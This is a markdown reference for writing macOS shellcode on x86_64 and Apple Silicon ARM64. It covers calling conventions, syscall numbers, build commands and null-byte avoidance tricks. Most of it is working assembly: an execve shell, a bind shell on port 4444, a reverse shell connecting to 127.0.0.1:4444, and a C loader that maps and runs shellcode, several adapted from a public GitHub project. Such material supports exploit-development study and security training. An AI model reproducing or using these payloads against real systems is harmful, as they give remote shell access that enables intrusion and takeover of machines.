# Shellcode Reference

## AMD64 Calling Convention (System V / macOS)

### Register Usage

| Register | Purpose |
|----------|---------|
| RDI | 1st argument |
| RSI | 2nd argument |
| RDX | 3rd argument |
| RCX | 4th argument (note: kernel uses R10) |
| R8 | 5th argument |
| R9 | 6th argument |
| RAX | Return value / syscall number |
| RIP | Instruction pointer |
| RSP | Stack pointer (must be 16-byte aligned at call) |
| R10 | 4th arg in syscall (replaces RCX) |

### Caller-saved: RAX, RCX, RDX, RSI, RDI, R8-R11
### Callee-saved: RBX, RBP, R12-R15

## macOS BSD Syscall Interface

### Syscall Class Encoding

```
syscall_number = (class << 24) | unix_syscall_number
```

| Class | Value | Shifted |
|-------|-------|---------|
| NONE | 0 | 0x0000000 |
| MACH | 1 | 0x1000000 |
| UNIX | 2 | 0x2000000 |
| MDEP | 3 | 0x3000000 |
| DIAG | 4 | 0x4000000 |
| IPC | 5 | 0x5000000 |

### Key Syscall Numbers (UNIX class, add 0x2000000 prefix)

| # | Name | Signature |
|---|------|-----------|
| 1 | exit | `void exit(int status)` |
| 4 | write | `ssize_t write(int fd, void *buf, size_t nbyte)` |
| 30 | accept | `int accept(int s, sockaddr *addr, socklen_t *addrlen)` |
| 59 | execve | `int execve(char *path, char *argv[], char *envp[])` |
| 90 | dup2 | `int dup2(int old, int new)` |
| 97 | socket | `int socket(int domain, int type, int protocol)` |
| 98 | connect | `int connect(int s, sockaddr *addr, socklen_t addrlen)` |
| 104 | bind | `int bind(int s, sockaddr *addr, socklen_t addrlen)` |
| 106 | listen | `int listen(int s, int backlog)` |

### Invocation

```nasm
mov rax, 0x200003b    ; execve = 0x2000000 + 59
syscall               ; Invoke syscall, return in RAX
; On error: carry flag set, RAX = errno
```

## Build Toolchain

```bash
# Assemble
nasm -f macho64 shellcode.asm

# Link
ld -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib \
   -lSystem -o shellcode shellcode.o

# Extract raw bytes
objdump -d shellcode | grep -oP '(?<=\t)[0-9a-f]{2}(?= )' | tr -d '\n'

# Test for NULL bytes
objdump -d shellcode | grep ' 00 '
```

## Shellcode Pattern: Write to stdout

```nasm
global _main
section .text
_main:
    mov rax, 0x2000004      ; write
    mov rdi, 1              ; fd = stdout
    mov rbx, 'hi'           ; string on stack
    push rbx
    mov rsi, rsp            ; buf = stack pointer
    mov rdx, 2              ; nbyte = 2
    syscall

    mov rax, 0x2000001      ; exit
    xor rdi, rdi            ; status = 0
    syscall
```

## Shellcode Pattern: execve Command Execution

```nasm
; execve("/bin/zsh", ["/bin/zsh", "-c", "command"], NULL)
xor rdx, rdx              ; envp = NULL

; Build filename on stack
push rdx                   ; NULL terminator
mov rbx, '/bin/zsh'        ; 8 bytes (pad or adjust)
push rbx
mov rdi, rsp               ; rdi = filename ptr

; Build "-c" arg
push rdx                   ; NULL pad
mov rbx, '-c'
push rbx
mov rcx, rsp               ; rcx = "-c" ptr

; Get command string (jmp/call/pop technique)
jmp cmd_string
got_cmd:
    pop rbx                ; rbx = command string ptr (from call)

    ; Build argv array on stack (NULL-terminated)
    push rdx               ; NULL terminator
    push rbx               ; argv[2] = command
    push rcx               ; argv[1] = "-c"
    push rdi               ; argv[0] = "/bin/zsh"
    mov rsi, rsp           ; rsi = argv

    ; execve syscall
    push 59
    pop rax                ; small value, no NULL bytes
    bts rax, 25            ; set bit 25 = add 0x2000000
    syscall

cmd_string:
    call got_cmd
    db "id", 0             ; command to execute
```

## NULL Byte Elimination Techniques

| Problem | Solution |
|---------|----------|
| `mov rax, 59` (contains 0x00 padding) | `push 59; pop rax` |
| `mov rax, 0x200003b` (leading zeros) | `push 59; pop rax; bts rax, 25` |
| Need zero register | `xor rdx, rdx` |
| String termination | Push `xor`'d register first, then string |
| Value like 0x100 | `mov al, 0xff; inc al` or shift tricks |
| 8-byte string < 8 chars | Pad carefully, or push as smaller chunks |

### The `bts` Trick

```nasm
push 59         ; 0x3b - no NULL bytes
pop rax         ; rax = 0x3b
bts rax, 25     ; set bit 25: rax = 0x200003b (UNIX class + execve)
```

## Bind Shell Shellcode

### C Pseudocode

```c
// 1. Create socket
int fd = socket(AF_INET/*2*/, SOCK_STREAM/*1*/, IPPROTO_IP/*0*/);

// 2. Bind to port
struct sockaddr_in addr = {
    .sin_len    = 0,
    .sin_family = AF_INET,      // 2
    .sin_port   = htons(4444),  // 0x5c11 -> stored as 0x115c
    .sin_addr   = INADDR_ANY,   // 0
};
bind(fd, (struct sockaddr *)&addr, sizeof(addr));

// 3. Listen
listen(fd, 0);

// 4. Accept connection
int conn = accept(fd, NULL, NULL);

// 5. Redirect stdio
dup2(conn, 2);  // stderr
dup2(conn, 1);  // stdout
dup2(conn, 0);  // stdin

// 6. Execute shell
execve("/bin/zsh", NULL, NULL);
```

### Key ASM Details

```nasm
; sockaddr_in on stack (16 bytes, little-endian):
; sin_len(1) + sin_family(1) + sin_port(2) + sin_addr(4) + sin_zero(8)
xor rdi, rdi
push rdi                    ; sin_zero (8 bytes)
mov dword [rsp-4], 0        ; sin_addr = INADDR_ANY
mov word [rsp-6], 0x5c11    ; sin_port = htons(4444)
mov byte [rsp-7], 0x02      ; sin_family = AF_INET
mov byte [rsp-8], 0x10      ; sin_len = 16
sub rsp, 8

; Save socket fd in R9, connection fd in R10

; dup2 loop (2, 1, 0):
mov rsi, 2
dup2_loop:
    push 90
    pop rax
    bts rax, 25             ; 0x200005a = dup2
    mov rdi, r10            ; conn fd
    syscall
    dec rsi
    jns dup2_loop           ; loop while RSI >= 0
```

## ARM64 (Apple Silicon) Shellcode

Reference project: [daem0nc0re/macOS_ARM64_Shellcode](https://github.com/daem0nc0re/macOS_ARM64_Shellcode) — null-byte free ARM64 shellcode collection for macOS.

### ARM64 Calling Convention (AAPCS64 / macOS)

| Register | Purpose |
|----------|---------|
| X0-X7 | Arguments 1-8 |
| X0 | Return value |
| X8 | Indirect result (on Linux; macOS does **not** use X8 for syscalls) |
| X16 | Syscall number on macOS |
| X29 (FP) | Frame pointer |
| X30 (LR) | Link register (return address) |
| SP | Stack pointer (must be 16-byte aligned) |
| XZR | Hardwired zero register — use instead of `mov x0, #0` |

### Caller-saved: X0-X18
### Callee-saved: X19-X28, X29 (FP), X30 (LR)

### macOS ARM64 Syscall Invocation

```asm
mov  x16, #59           ; syscall number (execve) — raw number, no class prefix
mov  x0, x20            ; arg1: filename
mov  x1, xzr            ; arg2: argv = NULL
mov  x2, xzr            ; arg3: envp = NULL
svc  #0x1337            ; trigger syscall (immediate value is ignored by kernel)
```

Key differences from x86_64:
- **No class prefix** — ARM64 macOS syscalls use the raw UNIX syscall number in X16, not `0x2000000 + N`
- **`svc` immediate is ignored** — the kernel does not check the immediate operand of `svc`, so `svc #0x80`, `svc #0x1337`, or `svc #0` all work identically. Using a non-standard value like `#0x1337` avoids null bytes in the encoding
- **Zero register** — `xzr` provides a hardware zero without needing `xor`

### ARM64 Build Toolchain

```makefile
# Makefile pattern from daem0nc0re/macOS_ARM64_Shellcode
LDFLAGS=-lSystem -syslibroot `xcrun -sdk macosx --show-sdk-path` -arch arm64

%.o: %.s
	as $< -o $@

shell: shell.o
	ld $(LDFLAGS) -o shell.macho shell.o
```

```bash
# Manual build steps
as shellcode.s -o shellcode.o
ld -lSystem -syslibroot $(xcrun -sdk macosx --show-sdk-path) \
   -arch arm64 -o shellcode.macho shellcode.o

# Disassemble
otool -tv shellcode.macho

# Extract raw shellcode bytes (ARM64 little-endian byte swap)
# From daem0nc0re/macOS_ARM64_Shellcode/helper/extract.sh
for s in $(objdump -d shellcode.macho | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2); do
    echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```

### ARM64 Shellcode Loader (JIT mmap)

A loader for testing ARM64 shellcode on macOS, using `MAP_JIT` for Apple Silicon W^X enforcement.
Source: [daem0nc0re/macOS_ARM64_Shellcode/helper/loader.c](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c)

```c
/*
 * Compile: clang -o loader loader.c
 */
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
    printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

    void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ,
                     MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

    if (ptr == MAP_FAILED) {
        perror("mmap");
        exit(-1);
    }
    printf("[+] SUCCESS: mmap\n");
    printf("    |-> Return = %p\n", ptr);

    void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
    printf("[+] SUCCESS: memcpy\n");
    printf("    |-> Return = %p\n", dst);

    int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

    if (status == -1) {
        perror("mprotect");
        exit(-1);
    }
    printf("[+] SUCCESS: mprotect\n");
    printf("    |-> Return = %d\n", status);

    printf("[>] Trying to execute shellcode...\n");

    sc = ptr;
    sc();

    return 0;
}
```

Key points:
- `MAP_JIT` flag is required on Apple Silicon — W^X (write XOR execute) is hardware-enforced
- Flow: `mmap(RW | MAP_JIT)` → `memcpy(shellcode)` → `mprotect(RX)` → execute via function pointer
- Without `MAP_JIT`, `mprotect` to add `PROT_EXEC` will fail on ARM64 macOS
- For hardened runtime binaries, the `com.apple.security.cs.allow-jit` entitlement is required
- Compile: `clang -o loader loader.c` (no special flags needed)

### ARM64 Shellcode Pattern: execve("/bin/sh")

From [daem0nc0re/macOS_ARM64_Shellcode/shell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode):

```asm
.section __TEXT,__text
.global _main
.align 2
_main:
    // execve("/bin/sh", 0, 0)
    mov  x1, #0x622F            // "/b" (bytes reversed in register)
    movk x1, #0x6E69, lsl #16  // "in"
    movk x1, #0x732F, lsl #32  // "/s"
    movk x1, #0x68, lsl #48    // "h\0"
    str  x1, [sp, #-8]         // push string to stack
    mov  x1, #8
    sub  x0, sp, x1            // x0 = pointer to "/bin/sh"
    mov  x1, xzr               // argv = NULL
    mov  x2, xzr               // envp = NULL
    mov  x16, #59              // execve
    svc  #0x1337
```

### ARM64 Bind Shell (Port 4444)

From [daem0nc0re/macOS_ARM64_Shellcode/bindshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode):

```asm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
    // s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
    mov  x16, #97               // socket syscall
    lsr  x1, x16, #6           // x1 = 97 >> 6 = 1 (SOCK_STREAM) — avoids literal #1
    lsl  x0, x1, #1            // x0 = 1 << 1 = 2 (AF_INET) — avoids literal #2
    mov  x2, xzr               // protocol = 0
    svc  #0x1337

    mvn  x3, x0                // save fd via bitwise NOT (avoids clobbering by syscalls)

call_bind:
    // struct sockaddr_in { sin_len=0x10, sin_family=2, sin_port=0x115C, sin_addr=0 }
    mov  x1, #0x0210           // sin_len=0x10 | sin_family=0x02 (packed as 16-bit LE)
    movk x1, #0x5C11, lsl #16  // sin_port = htons(4444)
    str  x1, [sp, #-8]
    mov  x2, #8
    sub  x1, sp, x2            // x1 = pointer to sockaddr
    mov  x2, #16               // addrlen
    mov  x16, #104             // bind
    svc  #0x1337

call_listen:
    mvn  x0, x3                // restore fd (NOT of saved value)
    lsr  x1, x2, #3           // backlog = 16 >> 3 = 2
    mov  x16, #106             // listen
    svc  #0x1337

call_accept:
    mvn  x0, x3                // restore fd
    mov  x1, xzr
    mov  x2, xzr
    mov  x16, #30              // accept
    svc  #0x1337

    mvn  x3, x0                // save conn fd
    lsr  x2, x16, #4          // x2 = 30 >> 4 = 1
    lsl  x2, x2, #2           // x2 = 1 << 2 = 4 (loop init, will become 2→1→0)

call_dup:
    // dup2(conn, 2) → dup2(conn, 1) → dup2(conn, 0)
    mvn  x0, x3                // restore conn fd
    lsr  x2, x2, #1           // shift down: 4→2→1→0 (but loop exits at 0)
    mov  x1, x2               // fd2 = current counter
    mov  x16, #90             // dup2
    svc  #0x1337
    mov  x10, xzr
    cmp  x10, x2
    bne  call_dup              // loop while x2 != 0

call_execve:
    // execve("/bin/sh", 0, 0)
    mov  x1, #0x622F
    movk x1, #0x6E69, lsl #16
    movk x1, #0x732F, lsl #32
    movk x1, #0x68, lsl #48
    str  x1, [sp, #-8]
    mov  x1, #8
    sub  x0, sp, x1
    mov  x1, xzr
    mov  x2, xzr
    mov  x16, #59
    svc  #0x1337
```

### ARM64 Reverse Shell (127.0.0.1:4444)

From [daem0nc0re/macOS_ARM64_Shellcode/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode):

```asm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
    mov  x16, #97
    lsr  x1, x16, #6           // SOCK_STREAM = 1
    lsl  x0, x1, #1            // AF_INET = 2
    mov  x2, xzr
    svc  #0x1337

    mvn  x3, x0                // save fd

call_connect:
    // sockaddr_in: sin_len=0x10, sin_family=2, port=4444, addr=127.0.0.1
    mov  x1, #0x0210
    movk x1, #0x5C11, lsl #16  // port 4444
    movk x1, #0x007F, lsl #32  // 127.0 (first two octets of 127.0.0.1)
    movk x1, #0x0100, lsl #48  // 0.1   (last two octets)
    str  x1, [sp, #-8]
    mov  x2, #8
    sub  x1, sp, x2
    mov  x2, #16
    mov  x16, #98              // connect
    svc  #0x1337

    lsr  x2, x2, #2           // x2 = 16 >> 2 = 4 (loop init)

call_dup:
    mvn  x0, x3
    lsr  x2, x2, #1
    mov  x1, x2
    mov  x16, #90
    svc  #0x1337
    mov  x10, xzr
    cmp  x10, x2
    bne  call_dup

call_execve:
    mov  x1, #0x622F
    movk x1, #0x6E69, lsl #16
    movk x1, #0x732F, lsl #32
    movk x1, #0x68, lsl #48
    str  x1, [sp, #-8]
    mov  x1, #8
    sub  x0, sp, x1
    mov  x1, xzr
    mov  x2, xzr
    mov  x16, #59
    svc  #0x1337
```

### ARM64 NULL Byte Elimination Techniques

| Problem | Solution | Example from daem0nc0re |
|---------|----------|------------------------|
| Need zero | Use `xzr` register | `mov x2, xzr` |
| Need constant 1 | Derive from syscall number | `lsr x1, x16, #6` (97>>6=1) |
| Need constant 2 | Shift from 1 | `lsl x0, x1, #1` |
| Preserve fd across syscalls | `mvn` (bitwise NOT) to save, `mvn` to restore | `mvn x3, x0` ... `mvn x0, x3` |
| Build string on stack | `mov`/`movk` chain + `str` | Build "/bin/sh" in 4 `movk` instructions |
| `svc` immediate encoding | Use non-zero immediate | `svc #0x1337` (kernel ignores the value) |
| sockaddr_in struct | Pack `sin_len`+`sin_family` into one 16-bit `mov` | `mov x1, #0x0210` (len=0x10, family=0x02) |
| dup2 loop counter | Derive from prior register, shift down each iteration | `lsr x2, x2, #1` as decrement |

## C-Based Shellcode Technique

### Avoiding RIP-Relative Addressing

```c
// BAD: compiler generates RIP-relative LEA for string literals
char *path = "/bin/zsh";

// GOOD: char array on stack, no RIP-relative reference
char path[] = {'/', 'b', 'i', 'n', '/', 'z', 's', 'h', 0};
```

### Function Pointer Typedefs (Avoiding Stub Calls)

```c
// Define function pointer type
typedef int *(*execv_t)(const char *, char * const *);

// Find address at runtime:
// printf("0x%lx\n", (unsigned long)execv);

// Use hardcoded address (from dyld shared cache)
execv_t my_execv = (execv_t)0x7fff20420e08;
char path[] = {'/', 'b', 'i', 'n', '/', 'z', 's', 'h', 0};
my_execv(path, NULL);
```

### Compile as Position-Independent Shellcode

```bash
# Compile to object
gcc -c shellcode.c -o shellcode.o

# Extract .text section bytes
objcopy -O binary -j .text shellcode.o shellcode.bin
```
